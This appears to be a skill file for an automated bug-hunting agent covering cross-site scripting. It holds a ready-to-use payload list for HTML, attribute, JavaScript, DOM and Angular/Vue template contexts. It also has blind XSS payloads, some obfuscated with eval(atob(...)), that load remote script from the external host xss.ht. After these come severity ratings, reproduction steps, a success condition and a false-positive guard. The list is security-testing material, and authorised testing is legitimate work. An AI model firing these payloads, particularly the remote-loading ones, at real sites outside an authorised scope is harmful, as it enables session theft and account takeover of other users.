---
repro: technique-authored
---

# SKILL: xss
## Payloads
HTML: <img src=x onerror=alert(1)>
Attr: "><svg onload=alert(1)>
JS: ';alert(1);//
DOM: #<img src=x onerror=alert(1)>
## Blind XSS
"><script src=https://xss.ht></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.ht\';document.body.appendChild(a)')
"><input onfocus=eval(atob(this.id)) id=<b64> autofocus>
"><img src=x id=<b64> onerror=eval(atob(this.id))>
<script>$.getScript("//xss.ht")</script>
{{constructor.constructor('import("https://xss.ht")')()}}
## CSTI
Angular: {{$on.constructor('alert(1)')()}}
Vue: {{constructor.constructor('alert(1)')()}}
Mavo: [7*7]
## Triage
Reflected → Low/Med. Stored → High. Stored + ATO → Critical.

## Steps to reproduce


> Status: `repro: technique-authored` — authored and reviewed for correctness against the reflected/stored XSS class. Not executed against a live host; live confirmation needs an in-scope target.


### Preconditions
- A parameter (query, body, header, or path segment) whose value appears in an HTML response, OR is stored and later rendered to other users (stored XSS).
- The output is not contextually encoded/sanitized for the sink where it lands.


### Steps
1. Inject a unique, non-active marker first to locate the reflection and its HTML context: e.g. `zqx741<b>zqx741`. Find `zqx741` in the response and note whether the surrounding `<b>` is rendered as a tag or shown as text.
2. Based on the context, send a context-appropriate breakout payload carrying a deterministic marker.
3. Render the page in a browser (or headless) and confirm the injected script context actually executes / the tag is live in the DOM.


Example request (placeholder host `TARGET`):
```
GET /search?q=zqx741"> HTTP/1.1 Host: TARGET


```
(for stored XSS, submit the payload via the storing request, then fetch the rendering page and apply the same check; attribute/JS-string contexts use the breakouts in `## Payloads`.)


### Success condition (machine-checkable)
- The marker is reflected/stored UNENCODED into an executable context: the raw bytes `<img src=x onerror=...` (or the chosen breakout) appear in the response as live markup — the `<` is NOT entity-encoded to `&lt;` — and a DOM/headless render fires the handler (e.g. the `onerror`/`alert(31337)` executes, verifiable via a DOM assertion or an out-of-band beacon). The unique marker `31337`/`zqx741` distinguishes it from unrelated page content.


### False-positive guard
- NOT XSS if the payload is HTML-entity-encoded (`&lt;img...`), URL-encoded, stripped, or lands only inside an HTML comment / `<textarea>` / an already-inert context with no breakout. Reflection as plain visible text with the angle brackets encoded is reflection, not execution. A CSP that blocks the script's execution means report it as mitigated, not confirmed, unless the payload bypasses the policy.
